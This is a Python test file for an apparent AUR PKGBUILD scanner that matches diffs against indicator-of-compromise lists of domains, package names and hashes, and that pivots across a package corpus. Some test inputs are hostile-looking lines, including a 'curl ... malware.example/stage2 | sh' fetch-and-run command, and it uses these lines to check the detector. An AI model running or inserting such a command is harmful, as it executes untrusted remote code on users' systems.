"""Phase 7 - Class E indicator matching (R106) and the corpus pivot.

R106 is the one rule that names a specific artefact, so the tests are about
exactness in both directions: it must fire on the artefact and it must stay
silent on everything that merely resembles it.  The shipped list is empty,
which is also the calibration gate - an out-of-the-box install cannot fire
R106 on any corpus diff.
"""

import pytest

from trustsight.analysis.ioc import _ioc_findings
from trustsight.config import DEFAULT_IOCS
from trustsight.findings import TEMPLATES
from trustsight.iocs import (
    CONFIDENCE_SEVERITY,
    IndicatorSet,
    load_indicators,
    normalize,
)


def _set(*entries, version: int = 7) -> IndicatorSet:
    return load_indicators({"meta": {"version": version}, "entries": list(entries)})


def _domain(value="malware.example", confidence="confirmed"):
    return {
        "type": "domain", "value": value, "confidence": confidence,
        "provenance": "ASA-2026-0001", "campaign": "2026-06",
    }


def _package(value="evil-pkg", confidence="confirmed"):
    return {"type": "package", "value": value, "confidence": confidence,
            "provenance": "ASA-2026-0001"}


_DIGEST = "a" * 64


def _hash(value=_DIGEST, confidence="high"):
    return {"type": "hash", "value": value, "confidence": confidence,
            "provenance": "vendor report"}


def _fire(diff, package_name="demo", indicators=None, current_text=None):
    findings = []

    def add(rule_id, name, severity, category, match, file="PKGBUILD",
            line=None, **extra):
        findings.append({
            "rule_id": rule_id, "severity": severity, "match": match,
            "line": line, "params": extra,
        })

    _ioc_findings(diff, package_name, {}, add, indicators=indicators,
                  current_text=current_text)
    return findings


# --- the shipped list -------------------------------------------------------


def test_shipped_list_is_empty():
    """TrustSight does not invent indicators, so a fresh install cannot fire."""
    shipped = load_indicators(_parse(DEFAULT_IOCS))
    assert len(shipped) == 0
    assert shipped.version == 1


def _parse(text: str) -> dict:
    import tomllib
    return tomllib.loads(text)


def test_empty_list_short_circuits():
    assert _fire("+source=('https://malware.example/x.tar.gz')",
                 indicators=_set()) == []


def test_template_is_registered():
    assert "R106" in TEMPLATES


# --- normalization ----------------------------------------------------------


def test_hash_normalization_rejects_non_digests():
    assert normalize("hash", _DIGEST.upper()) == _DIGEST
    assert normalize("hash", "a" * 63) is None       # not a digest length
    assert normalize("hash", "z" * 64) is None       # not hex


def test_domain_normalization_strips_only_noise():
    assert normalize("domain", "MALWARE.example.") == "malware.example"
    assert normalize("domain", "https://malware.example/path") == "malware.example"
    assert normalize("domain", "not a domain") is None


def test_package_names_fold_case_on_every_surface():
    """One indicator must not answer differently per surface.

    ``deps.normalize_dependency`` already folds dependency names, so an
    unfolded entry would fire on ``depends=('Evil-Pkg')`` and stay silent on
    a package literally named ``Evil-Pkg`` - a silent miss on a confirmed
    indicator.
    """
    assert normalize("package", " 'Evil-Pkg' ") == "evil-pkg"

    indicators = _set(_package())
    assert _fire("+pkgver=1", package_name="Evil-Pkg", indicators=indicators)
    assert _fire("+depends=('Evil-Pkg')", indicators=indicators)


def test_malformed_entries_are_dropped_not_coerced():
    indicators = _set(
        {"type": "carrier-pigeon", "value": "x", "confidence": "confirmed"},
        {"type": "hash", "value": "deadbeef", "confidence": "confirmed"},
        _domain(),
    )
    assert [i.value for i in indicators.all()] == ["malware.example"]


def test_untiered_entry_matches_at_the_lowest_severity():
    """An unsourced entry must not acquire a confirmed entry's weight."""
    indicators = _set(_domain(confidence=""))
    finding = _fire("+source=('https://malware.example/x')",
                    indicators=indicators)[0]
    assert finding["severity"] == "MEDIUM"


def test_confidence_tiers_map_to_severity():
    for tier, severity in CONFIDENCE_SEVERITY.items():
        indicators = _set(_domain(confidence=tier))
        finding = _fire("+source=('https://malware.example/x')",
                        indicators=indicators)[0]
        assert finding["severity"] == severity


# --- domain surface ---------------------------------------------------------


def test_fires_on_a_source_url_host():
    findings = _fire(
        "+source=('https://malware.example/payload.tar.gz')",
        indicators=_set(_domain()),
    )
    assert len(findings) == 1
    assert findings[0]["severity"] == "FATAL"
    assert findings[0]["params"]["ioc_value"] == "malware.example"
    assert findings[0]["params"]["provenance"] == "ASA-2026-0001"
    assert findings[0]["line"] == 1


def test_fires_on_a_bare_host_in_a_build_line():
    findings = _fire(
        "+  curl -s malware.example/stage2 | sh",
        indicators=_set(_domain()),
    )
    assert len(findings) == 1


def test_a_subdomain_is_not_the_indicator():
    assert _fire("+source=('https://cdn.malware.example/x')",
                 indicators=_set(_domain())) == []


def test_a_longer_domain_is_not_the_indicator():
    assert _fire("+source=('https://notmalware.example/x')",
                 indicators=_set(_domain())) == []
    assert _fire("+source=('https://malware.example.co/x')",
                 indicators=_set(_domain())) == []


def test_a_removed_line_is_not_a_reference():
    """Only what the diff adds is a declared fact of the new revision."""
    assert _fire("-source=('https://malware.example/x')",
                 indicators=_set(_domain())) == []


def test_host_matching_is_case_insensitive():
    assert len(_fire("+source=('https://MALWARE.Example/x')",
                     indicators=_set(_domain()))) == 1


def test_an_internationalised_host_matches_either_spelling():
    """The unicode name and its punycode are one host, not two.

    An indicator published in the script it was registered in must still
    match a PKGBUILD that spells it ``xn--``, and the reverse.
    """
    unicode_host = "mälware.example"
    punycode = unicode_host.encode("idna").decode("ascii")
    assert punycode != unicode_host

    from_unicode_entry = _set(_domain(value=unicode_host))
    assert _fire(f"+source=('https://{punycode}/x')", indicators=from_unicode_entry)
    assert _fire(f"+source=('https://{unicode_host}/x')", indicators=from_unicode_entry)

    from_punycode_entry = _set(_domain(value=punycode))
    assert _fire(f"+source=('https://{unicode_host}/x')", indicators=from_punycode_entry)


def test_userinfo_is_a_mention_not_a_destination():
    """``https://indicator@real/`` fetches from *real*, and must say so."""
    findings = _fire("+source=('https://malware.example@good.example/x')",
                     indicators=_set(_domain()))
    assert [f["params"]["surface"] for f in findings] == ["referenced_host"]


def test_the_real_authority_reads_as_the_source_host():
    findings = _fire("+source=('https://user@malware.example/x')",
                     indicators=_set(_domain()))
    assert findings[0]["params"]["surface"] == "source_host"


# --- current state, not just the delta --------------------------------------


def test_a_standing_reference_fires_when_the_file_is_available():
    """An indicator does not stop being one because today's diff missed it."""
    current = "pkgname=demo\ndepends=('evil-pkg' 'glibc')\n"
    indicators = _set(_package())
    assert _fire("+pkgver=2", indicators=indicators) == []
    findings = _fire("+pkgver=2", indicators=indicators, current_text=current)
    assert len(findings) == 1
    # the reference is not in the hunk, so there is no line to point at
    assert findings[0]["line"] is None


def test_a_standing_host_fires_from_the_current_file():
    current = "source=('https://malware.example/x.tar.gz')\n"
    findings = _fire("+pkgrel=2", indicators=_set(_domain()), current_text=current)
    assert len(findings) == 1
    assert findings[0]["params"]["surface"] == "source_host"


def test_a_reference_removed_by_this_diff_is_gone():
    """Current state is the post-image: what the revision deleted is not a fact."""
    current = "source=('https://example.org/x.tar.gz')\n"
    diff = "-source=('https://malware.example/x.tar.gz')\n+source=('https://example.org/x.tar.gz')"
    assert _fire(diff, indicators=_set(_domain()), current_text=current) == []


def test_state_and_delta_do_not_double_report():
    current = "source=('https://malware.example/x.tar.gz')\n"
    diff = "+source=('https://malware.example/x.tar.gz')"
    assert len(_fire(diff, indicators=_set(_domain()), current_text=current)) == 1


# --- package surface --------------------------------------------------------


def test_fires_on_the_packages_own_name():
    findings = _fire("+pkgver=1.0", package_name="evil-pkg",
                     indicators=_set(_package()))
    assert len(findings) == 1
    assert findings[0]["params"]["surface"] == "package_name"
    assert findings[0]["line"] is None


def test_fires_on_a_declared_dependency():
    findings = _fire("+depends=('evil-pkg' 'glibc')",
                     indicators=_set(_package()))
    assert len(findings) == 1
    assert findings[0]["params"]["field"] == "depends"


def test_a_similar_package_name_is_not_the_indicator():
    assert _fire("+depends=('evil-pkg-git')", indicators=_set(_package())) == []
    assert _fire("+pkgver=1", package_name="evil-pkg2",
                 indicators=_set(_package())) == []


# --- hash surface -----------------------------------------------------------


def test_fires_on_a_known_artifact_digest():
    findings = _fire(f"+sha256sums=('{_DIGEST}')", indicators=_set(_hash()))
    assert len(findings) == 1
    assert findings[0]["severity"] == "CRITICAL"  # the 'high' tier
    assert findings[0]["params"]["surface"] == "artifact_hash"


def test_a_truncated_digest_matches_nothing():
    assert _fire(f"+sha256sums=('{'a' * 63}')", indicators=_set(_hash())) == []


def test_a_digest_matches_wherever_it_appears():
    """A dropped artefact's hash is the artefact, not the checksum field."""
    findings = _fire(f"+  echo {_DIGEST} > /tmp/marker", indicators=_set(_hash()))
    assert len(findings) == 1


def test_a_digest_inside_a_longer_hex_run_is_not_that_digest():
    """A substring of a bigger blob is not the artefact's hash."""
    blob = _DIGEST + "b" * 32
    assert _fire(f"+  payload='{blob}'", indicators=_set(_hash())) == []


def test_a_b2sum_length_digest_matches():
    digest = "c" * 128
    findings = _fire(f"+b2sums=('{digest}')",
                     indicators=_set(_hash(value=digest)))
    assert len(findings) == 1


# --- reporting discipline ---------------------------------------------------


def test_one_indicator_reports_once_per_diff():
    diff = (
        "+source=('https://malware.example/a.tar.gz'\n"
        "+        'https://malware.example/b.tar.gz')"
    )
    assert len(_fire(diff, indicators=_set(_domain()))) == 1


def test_distinct_indicators_report_separately():
    diff = f"+source=('https://malware.example/x')\n+sha256sums=('{_DIGEST}')"
    findings = _fire(diff, indicators=_set(_domain(), _hash()))
    assert {f["params"]["ioc_type"] for f in findings} == {"domain", "hash"}


def test_findings_carry_the_list_version():
    finding = _fire("+source=('https://malware.example/x')",
                    indicators=_set(_domain(), version=42))[0]
    assert finding["params"]["list_version"] == 42


# --- calibration ------------------------------------------------------------


@pytest.mark.parametrize("diff", [
    "+source=('https://github.com/upstream/tool/archive/v1.0.tar.gz')\n"
    f"+sha256sums=('{'b' * 64}')",
    "+depends=('glibc' 'gcc-libs')",
    "+  curl -L https://example.org/x.tar.gz -o x.tar.gz",
])
def test_benign_shapes_never_fire_against_a_populated_list(diff):
    indicators = _set(_domain(), _package(), _hash())
    assert _fire(diff, package_name="ordinary-pkg", indicators=indicators) == []


# --- pipeline wiring --------------------------------------------------------


def test_scan_diff_reports_a_confirmed_indicator_as_fatal(monkeypatch):
    """End to end: the rule reaches the score, and FATAL means 100."""
    from trustsight.analysis.pipeline import scan_diff
    from trustsight.config import load_config

    monkeypatch.setattr("trustsight.analysis.ioc.load_indicators",
                        lambda: _set(_domain()))
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
        "-source=('https://example.org/x.tar.gz')\n"
        "+source=('https://malware.example/x.tar.gz')\n"
    )
    fact = scan_diff(diff, rules=[], config=load_config(),
                     package_name="demo", seen_urls={})
    hits = [e for e in fact.score_breakdown if e.rule_id == "R106"]
    assert len(hits) == 1
    assert hits[0].severity == "FATAL"
    assert fact.final_score == 100


def test_scan_diff_reads_the_current_file_when_given(monkeypatch):
    """The wiring, not just the rule, must carry current state."""
    from trustsight.analysis.pipeline import scan_diff
    from trustsight.config import load_config

    monkeypatch.setattr("trustsight.analysis.ioc.load_indicators",
                        lambda: _set(_domain()))
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n-pkgrel=1\n+pkgrel=2\n"
    current = "pkgname=demo\nsource=('https://malware.example/x.tar.gz')\n"

    without = scan_diff(diff, rules=[], config=load_config(),
                        package_name="demo", seen_urls={})
    assert not [e for e in without.score_breakdown if e.rule_id == "R106"]

    with_state = scan_diff(diff, rules=[], config=load_config(),
                           package_name="demo", seen_urls={},
                           current_text=current)
    assert [e for e in with_state.score_breakdown if e.rule_id == "R106"]


def test_an_r106_override_cannot_silence_a_confirmed_indicator(monkeypatch):
    """The overrides file is user-editable, and FATAL ignores it.

    A lower-tier indicator stays overridable - that is the point of the
    tiers - but a confirmed one is exactly what an attacker would want
    switched off.
    """
    from trustsight.override import RuleOverride, filter_triggered_rules

    monkeypatch.setattr(
        "trustsight.override.load_overrides",
        lambda: [RuleOverride(rule_id="R106", reason="noisy", package=None)],
    )
    confirmed = _fire("+source=('https://malware.example/x')",
                      indicators=_set(_domain()))[0]
    medium = _fire("+source=('https://malware.example/x')",
                   indicators=_set(_domain(confidence="medium")))[0]

    kept, suppressed = filter_triggered_rules(
        [{"rule_id": "R106", "severity": confirmed["severity"]}], package="demo"
    )
    assert kept and not suppressed

    kept, suppressed = filter_triggered_rules(
        [{"rule_id": "R106", "severity": medium["severity"]}], package="demo"
    )
    assert suppressed and not kept


# --- corpus pivot -----------------------------------------------------------


@pytest.fixture
def corpus_db(tmp_path, monkeypatch):
    from trustsight.db import init_db, save_pkgbuild_snapshot

    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    save_pkgbuild_snapshot(
        "dropper",
        "source=('https://malware.example/p.tar.gz')\n"
        f"sha256sums=('{_DIGEST}')\n",
        "",
        "1.0",
    )
    save_pkgbuild_snapshot(
        "innocent",
        "source=('https://example.org/p.tar.gz')\n",
        "",
        "1.0",
    )
    yield
    (tmp_path / "trustsight.db").unlink(missing_ok=True)


@pytest.fixture
def cold_db(tmp_path, monkeypatch):
    from trustsight.db import init_db

    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    yield
    (tmp_path / "trustsight.db").unlink(missing_ok=True)


_METADATA = {
    "evil-pkg": {"Name": "evil-pkg", "PackageBase": "evil-pkg",
                 "URL": "https://malware.example"},
    "downstream": {"Name": "downstream", "PackageBase": "downstream",
                   "Depends": ["evil-pkg>=1.0", "glibc"]},
    "unrelated": {"Name": "unrelated", "PackageBase": "unrelated",
                  "Depends": ["evil-pkg-git"], "URL": "https://example.org"},
}


def test_pivot_infers_the_indicator_type():
    from trustsight.full_aur.pivot import infer_type

    assert infer_type(_DIGEST) == "hash"
    assert infer_type("malware.example") == "domain"
    assert infer_type("evil-pkg") == "package"


def test_pivot_finds_packages_declaring_an_indicator_name(corpus_db):
    from trustsight.full_aur.pivot import pivot

    result = pivot("evil-pkg", metadata=_METADATA, indicators=_set(_package()))
    assert result["listed"] is True
    assert {m["package"] for m in result["matches"]} == {"evil-pkg", "downstream"}


def test_pivot_finds_packages_referencing_a_host(corpus_db):
    from trustsight.full_aur.pivot import pivot

    result = pivot("malware.example", metadata=_METADATA,
                   indicators=_set(_domain()))
    packages = {m["package"] for m in result["matches"]}
    assert packages == {"evil-pkg", "dropper"}  # metadata URL + stored PKGBUILD


def test_pivot_finds_packages_carrying_a_digest(corpus_db):
    from trustsight.full_aur.pivot import pivot

    result = pivot(_DIGEST, metadata=_METADATA, indicators=_set(_hash()))
    assert [m["package"] for m in result["matches"]] == ["dropper"]


def test_pivot_reports_an_unlisted_query(corpus_db):
    from trustsight.full_aur.pivot import pivot

    result = pivot("malware.example", metadata=_METADATA, indicators=_set())
    assert result["listed"] is False
    assert result["confidence"] is None
    assert result["matches"]


def test_pivot_names_what_it_searched(corpus_db):
    """A hit must say which store it came from."""
    from trustsight.full_aur.pivot import pivot

    result = pivot("malware.example", metadata=_METADATA, indicators=_set())
    assert any("metadata" in s for s in result["sources"])
    assert any("snapshot" in s for s in result["sources"])


def test_pivot_on_a_cold_corpus_searched_nothing(cold_db):
    """An empty corpus must not read as 'nothing references it'."""
    from trustsight.full_aur.pivot import pivot

    result = pivot("malware.example", metadata={}, indicators=_set())
    assert result["matches"] == []
    assert result["sources"] == []


def test_pivot_type_override_beats_the_shape_guess(corpus_db):
    """A package name can be spelled like a host; the caller decides."""
    from trustsight.full_aur.pivot import infer_type, pivot

    metadata = {
        "some.tool": {"Name": "some.tool", "PackageBase": "some.tool",
                      "URL": "https://example.org"},
    }
    assert infer_type("some.tool") == "domain"  # shape says domain

    guessed = pivot("some.tool", metadata=metadata, indicators=_set())
    assert guessed["matches"] == []

    forced = pivot("some.tool", metadata=metadata, indicators=_set(),
                   type="package")
    assert [m["package"] for m in forced["matches"]] == ["some.tool"]


def test_pivot_cli_rejects_an_unknown_type(isolated_cli):
    result = _run("corpus", "pivot", "evil-pkg", "--type", "maintainer")
    assert result.exit_code == 2
    assert "unknown indicator type" in result.output


def test_pivot_rejects_an_unusable_value(corpus_db):
    from trustsight.full_aur.pivot import pivot

    result = pivot("a" * 63 + ".", metadata=_METADATA, indicators=_set())
    assert result["matches"] == []


# --- the CLI command --------------------------------------------------------


@pytest.fixture
def isolated_cli(tmp_path, monkeypatch):
    """Point the CLI's config and database at a scratch directory."""
    import trustsight.config as config

    monkeypatch.setattr(config, "CONFIG_DIR", tmp_path / "config")
    monkeypatch.setattr(config, "DATA_DIR", tmp_path / "data")
    monkeypatch.setattr(config, "CACHE_DIR", tmp_path / "cache")
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path / "data")
    (tmp_path / "data").mkdir(parents=True, exist_ok=True)


def _run(*args):
    from typer.testing import CliRunner

    from trustsight.cli.app import app

    return CliRunner().invoke(app, list(args))


def test_pivot_cli_reports_a_cold_corpus(isolated_cli):
    """The CLI must not present 'no data' as 'no reference'."""
    result = _run("corpus", "pivot", "malware.example")
    assert result.exit_code == 0
    assert "No corpus data searched" in result.output


def test_pivot_cli_emits_json(isolated_cli):
    import json

    from trustsight.db import init_db, save_pkgbuild_snapshot

    init_db()
    save_pkgbuild_snapshot(
        "dropper", "source=('https://malware.example/p.tar.gz')\n", "", "1.0"
    )
    result = _run("corpus", "pivot", "malware.example", "--json")
    assert result.exit_code == 0
    payload = json.loads(result.output)
    assert payload["type"] == "domain"
    assert payload["listed"] is False
    assert [m["package"] for m in payload["matches"]] == ["dropper"]
